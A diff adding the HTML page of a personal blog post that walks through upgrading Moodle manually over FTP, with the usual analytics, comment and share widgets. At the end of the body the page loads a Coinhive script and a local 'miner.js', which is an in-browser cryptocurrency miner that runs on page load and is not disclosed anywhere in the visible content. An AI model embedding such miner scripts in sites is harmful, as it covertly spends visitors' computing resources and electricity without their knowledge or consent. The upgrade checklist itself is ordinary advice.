@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<script>
+		var host = "michelenasti.com";
+		if ((host == window.location.host) && (window.location.protocol != "https:"))
+			window.location.protocol = "https";
+	</script>
+	
+	<title>Unofficial but simple way to upgrade Moodle - Michele Nasti's blog</title>
+	<meta name="description" content="
+
+" />
+	<meta name="keywords" content="moodle, upgrade" />  
+	<meta http-equiv="last-modified" content="2017-09-19 10:17:10 +0200" /> 
+	<!--<noscript>-->
+	<link rel="stylesheet" href="/css/skel.css" />
+	<link rel="stylesheet" href="/css/style.css" />
+	<link rel="stylesheet" href="/css/style-xlarge.css" />
+	<link rel="stylesheet" href="/css/colorful.css" />
+	<link rel="stylesheet" href="/css/social.css" />
+	<link rel="stylesheet" href="/node_modules/animate.css/animate.min.css" />
+	<meta name="google-site-verification" content="wpVjnRuXV99CAZxjYBzZgKbJm-8_tdLPrlP43u9zhV0" /> <!-- facebook Open Graph Metadatas -->
+<meta content="your_facebook_app_id" property="fb:app_id">
+<meta content="" property="og:site_name">
+
+
+  <meta content="Unofficial but simple way to upgrade Moodle" property="og:title">
+
+
+
+  <meta content="article" property="og:type">
+
+
+
+  <meta content="I'm a full stack Developer with an eye for the web." property="og:description">
+
+
+
+  <meta content="https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/" property="og:url">
+
+
+
+  <meta content="2015-11-12T10:09:18+01:00" property="article:published_time">
+  <meta content="https://www.facebook.com/micnasti/" property="article:author">
+
+
+
+<meta content="/img/logo-high-resolution.png" property="og:image">
+
+
+
+  
+  <meta content="moodle" property="article:tag">
+  
+  <meta content="upgrade" property="article:tag">
+  
+
+
+<!-- Twitter cards metadatas -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@vdaubry">
+<meta name="twitter:creator" content="@micnasti">
+
+  <meta name="twitter:title" content="Unofficial but simple way to upgrade Moodle">
+
+
+  <meta name="twitter:url" content="https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/">
+
+
+
+  <meta name="twitter:description" content="I'm a full stack Developer with an eye for the web.">
+
+
+
+	<!--</noscript>-->
+	<!--[if lte IE 8]><link rel="stylesheet" href="/css/ie/v8.css" /><![endif]-->
+	<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-88764277-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+	<link rel="stylesheet" href="/css/prism.css" />
+</head>
+
+<body id="top">
+
+	<header id="header">
+	<a href="#" class="image avatar"><img src="/images/michele_nasti.jpg" alt="michele nasti volto" /></a>
+	<h1><strong><a href="/">Michele Nasti</a></strong><br /> Full-stack developer <br> with an eye for the web<br>
+	</h1>
+<a href="/chi-sono-michele-nasti/">Chi sono</a> | 
+<a href="/talks-conferences/">Talks &amp; Conferences</a> | 
+<a href="/archives/">Archives</a>
+
+</header> <div id="main">
+	<article>
+		<header class="major">
+			<h1 class="post-title"><a href="/2015/11/unofficial-but-simple-way-to-upgrade-moodle/">Unofficial but simple way to upgrade Moodle</a></h1>
+			<p class="post-meta">Nov 12, 2015 • musikele</p>
+		</header>
+
+		<section>
+
+			<p><a href="https://i2.wp.com/michelenasti.com/wp-content/uploads/2015/11/moodle-logo.png"><img class="aligncenter size-full wp-image-422" src="https://i2.wp.com/michelenasti.com/wp-content/uploads/2015/11/moodle-logo.png?fit=204%2C61" alt="moodle-logo" data-recalc-dims="1" /></a></p>
+
+<p>In the last days I have been involved in setting up a Moodle website. Moodle is a very complex software that wights 140+ MB, about 14000+ files. Installing it is difficoult, Upgrading it is a pain. Why?</p>
+
+<p>Compared to other php applications, like WordPress, Moodle is not so automatized. Installing it means to creating a folder outside the http root of your server, creating a database and setting up a cron job. WordPress does not need this and its installation (and backup) (and upgrade) is totally automatic!</p>
+
+<p>Recently I also received an attack on my moodle server that caused me some big trouble; all hostings were turning off my account asking me to repair it.</p>
+
+<h4 id="upgrading-moodle-how-i-do-it">Upgrading Moodle: how I do it</h4>
+
+<p>I am using a private italian hosting, and I am not able to access the server via ssh so I have to upgrade via ftp.</p>
+
+<p>First, unnamed step:</p>
+
+<ul>
+  <li>did you backup? (I pay the hosting for a weekly backup, for now this is good!)</li>
+</ul>
+
+<p>then, my checklist:</p>
+
+<ol>
+  <li>upload latest moodle.zip.</li>
+  <li>maintenance mode.</li>
+  <li>access via ftp with Filezilla.</li>
+  <li>create a new folder called “moodle_old”.</li>
+  <li>copy all content of http root into moodle_old.</li>
+  <li>uncompress latest moodle.zip. You get a /moodle directory.</li>
+  <li>move the content of /moodle in the http root.</li>
+  <li>move config.php and custom plugins from /moodle_old to the http root.</li>
+  <li>reach out your website with a browser and do the DB upgrade, upgrade plugins, etc etc (from this point you can follow instructions in browser).</li>
+</ol>
+
+<p>Et voilà! Moodle is updated. 9 steps is still a lot tough. There are many steps that you can do wrong and loose all your files. I wonder Moodle was easier to upgrade, but the truth is that it’s one of the most cusotmized software in the planet - what if an automatic upgrade deletes a university customization?</p>
+
+<p>You get the point. Happy upgrading.</p>
+
+ 
+<ul class="share-buttons">
+  <li><a href="https://www.facebook.com/sharer/sharer.php?u=https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/&t=" title="Share on Facebook" target="_blank" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/) + '&t=' + encodeURIComponent(document.title)); return false;"><img alt="Share on Facebook" src="/images/icons/Facebook.svg"></a></li>
+  <li><a href="https://twitter.com/intent/tweet?source=https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/&text=Unofficial but simple way to upgrade Moodle:%20https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/&via=micnasti" target="_blank" title="Tweet" onclick="window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent(Unofficial but simple way to upgrade Moodle) + ':%20'  + encodeURIComponent(https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/)); return false;"><img alt="Tweet" src="/images/icons/Twitter.svg"></a></li>
+  <li><a href="https://plus.google.com/share?url=https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/" target="_blank" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=' + encodeURIComponent(https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/)); return false;"><img alt="Share on Google+" src="/images/icons/Google+.svg"></a></li>
+  <li><a href="http://www.linkedin.com/shareArticle?mini=true&url=https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/&title=Unofficial but simple way to upgrade Moodle&summary=&source=https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/" target="_blank" title="Share on LinkedIn" onclick="window.open('http://www.linkedin.com/shareArticle?mini=true&url=' + encodeURIComponent(https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/) + '&title=' +  encodeURIComponent(document.title)); return false;"><img alt="Share on LinkedIn" src="/images/icons/LinkedIn.svg"></a></li>
+</ul>
+
+		</section>
+
+		<section>
+			 <div id="disqus_thread"></div>
+<script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    
+    var disqus_config = function () {
+    	//var disqus_identifier = 'https://michelenasti.com';
+			//var disqus_url = '';
+			var disqus_url = 'https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/';
+			var disqus_identifier = 'https://michelenasti.com/2015/11/unofficial-but-simple-way-to-upgrade-moodle/';
+
+    };
+    
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//michele-nastis-blog.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript> 
+		</section>
+
+		<footer>
+			<br> Altri articoli:
+			<br>
+			<div class="row">
+				
+
+				<div class="6u 12u(small) excerpt" id="previousArticle">
+					<header>
+						<h2><a href="/2015/11/angularizing-a-jquery-website-template-what-i-discovered-what-i-have-done/">Angularizing a jQuery website template: what I discovered, what I have done</a></h2>
+					</header>
+					<section>
+						<p>In my <a href="http://michelenasti.com/2015/10/start-custom-js-with-ngroute/">last post</a> I talked about angularizing a jQuery template for a new website I am developing.</p>
+
+
+					</section>
+					<div>
+						<ul class="actions">
+							<li><a href="/2015/11/angularizing-a-jquery-website-template-what-i-discovered-what-i-have-done/" class="button">Read More</a></li>
+						</ul>
+					</div>
+				</div>
+				 
+
+				<div class="6u$ 12u(small) excerpt f-right" id="nextArticle">
+					<header>
+						<h2><a href="/2015/11/react-js-day-a-napoli-impressioni/">React.js day a Napoli: impressioni</a></h2>
+					</header>
+					<section>
+						<p>Hi all,</p>
+
+<p>Ieri ho partecipato al primo <strong>evento su React</strong> organizzato a Napoli, nella sede di Rework. I due speaker <strong><a href="http://esposi.to">Gianluca Esposito</a></strong> e <strong><a href="https://www.linkedin.com/in/davidecerbo">Davide Cerbo</a></strong> sono stati due miei colleghi e, oltre a salutarli, sono andato anche a sentire un po’ di dissertazioni sul tema della UI <em>the-react-way</em>.</p>
+
+
+					</section>
+					<div>
+						<ul class="actions">
+							<li><a href="//2015/11/react-js-day-a-napoli-impressioni/" class="button">Read More</a></li>
+						</ul>
+					</div>
+				</div>
+				
+			</div>
+		</footer>
+
+	</article>
+
+</div>
+<script src="/js/infinite-scroll.js"></script>
+
+	<!-- Footer -->
+	<footer id="footer">
+	<ul class="icons">
+
+		
+		<li>
+			<a href="https://github.com/musikele" class="icon fa-github">
+				<span class="label">GitHub</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://twitter.com/micnasti" class="icon fa-twitter">
+				<span class="label">Twitter</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://linkedin.com/in/michelenasti" class="icon fa-linkedin">
+				<span class="label">LinkedIn</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://plus.google.com/MicheleNasti" class="icon fa-google-plus">
+				<span class="label">Google+</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://www.facebook.com/musikele" class="icon fa-facebook">
+				<span class="label">Facebook</span>
+			</a>
+		</li>
+		  
+	</ul>
+	<ul class="copyright">
+		<li>&copy; Michele Nasti</li>
+		<li>Based on <a href="http://html5up.net/strata">STRATA</a> theme</li>
+	</ul>
+</footer>
+	<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
+	<script src="/js/jquery.min.js"></script>
+	<script src="/js/jquery.poptrox.min.js"></script>
+	<script src="/js/skel.min.js"></script>
+	<script src="/js/init.js"></script>
+	<script src="/js/prism.js"></script>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="/js/miner.js"></script>
+	<!-- <script src="/js/badge.js"></script> -->
+</body>
+
+</html>
